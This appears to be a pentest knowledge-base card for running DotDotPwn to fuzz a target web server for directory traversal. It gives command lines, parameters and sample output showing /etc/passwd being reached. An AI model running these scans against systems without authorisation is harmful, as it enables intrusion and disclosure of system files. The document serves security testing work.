---
id: c62e5681-cec4-4318-b8c4-39d8331707b3
name: dotdotpwn-http-fuzzing
type: command
executor: bash
data: dotdotpwn -m http -h $_TARGET_HOST -M GET -d 6
output: null
created_at: '2020-09-03T18:36:33.270627+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - fuzzing
  - directory-traversal
verified: true
validated: true
---

# dotdotpwn-http-fuzzing

## Command

```bash
dotdotpwn -m http -h $_TARGET_HOST -M GET -d 6
```

## Description

This command uses DotDotPwn to perform HTTP GET-based fuzzing for directory traversal vulnerabilities on a target host. It generates traversal patterns (e.g., ../, encoded variants) up to 6 levels deep and tests against common sensitive files like /etc/passwd. Use this during web pentesting to automate detection of path traversal flaws.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-m http` | Specifies HTTP module for web fuzzing | Yes |
| `-h $_TARGET_HOST` | Target hostname or IP (e.g., 192.168.1.5) | Yes |
| `-M GET` | HTTP method (GET or POST) | Yes |
| `-d 6` | Traversal depth (number of ../ levels, default 5) | No |
| `-f $_FILE_LIST` | Custom file list (optional, defaults to Unix files) | No |
| `-P $_PATH` | Specific path to fuzz (e.g., /include.php?file=) | No |

## Examples

### Basic Usage

```bash
dotdotpwn -m http -h example.com -M GET
```

Fuzzes root path with default depth and files.

### Advanced Usage

```bash
dotdotpwn -m http -h 192.168.1.5 -M POST -d 10 -f custom_files.txt -P /upload.php?file=
```

Targets a specific upload endpoint with deeper traversals and custom targets.

## Expected Output

The command initializes the traversal engine, then tests paths, logging HTTP status for each:

```
[========== TARGET INFORMATION ==========]
[+] Hostname: 192.168.1.5
[+] Protocol: http
[+] Port: 80

[=========== TRAVERSAL ENGINE ===========]
[+] Traversal Engine DONE ! - Total traversal tests created: 11028

[=========== TESTING RESULTS ============]
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/../etc/passwd
[*] HTTP Status: 200 | Testing Path: http://192.168.1.5:80/../../../../etc/passwd  (Success example: would show file contents)
[+] Total Traversals found: 1
[+] Report saved: Reports/192.168.1.5_YYYY-MM-DD_HH-MM.txt
```

Success is indicated by 200 status codes with file contents; failures show 400/404. Report details all tests.

## Related

- [[procedures/Directory-Traversal-Fuzzing-with-DotDotPwn]]
- [[tools/dotdotpwn]]
